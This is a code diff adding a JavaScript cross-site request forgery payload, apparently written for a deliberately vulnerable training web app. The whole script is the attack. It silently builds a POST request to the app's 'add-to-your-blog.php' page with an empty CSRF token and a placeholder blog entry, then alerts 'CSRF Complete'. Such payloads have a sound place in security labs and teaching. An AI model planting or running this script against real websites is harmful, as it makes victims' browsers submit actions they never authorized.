@@ -1,0 +1,36 @@
+<script>
+	var lXMLHTTP; 
+	try{
+		var lBlogEntry = encodeURI("BLOG_ENTRY_GOES_HERE");
+		
+		var lData = "csrf-token=&blog_entry="+lBlogEntry+"&add-to-your-blog-php-submit-button=Save+Blog+Entry";
+		var lAction = "./index.php?page=add-to-your-blog.php";
+		var lMethod = "POST";
+
+		try {
+			lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP");
+		}catch(e){ 
+			try {
+				lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP");
+			}catch(e){
+				try{
+					lXMLHTTP = new XMLHttpRequest();
+				}catch(e){
+					alert(e.message);
+				}
+			}
+		}
+
+		lXMLHTTP.onreadystatechange = function(){
+			if(lXMLHTTP.readyState == 4){
+				alert("CSRF Complete");
+			}
+		};
+		
+		lXMLHTTP.open(lMethod, lAction, true);
+		lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+		lXMLHTTP.send(lData);
+	}catch(e){
+		alert(e.message);
+	}
+</script>
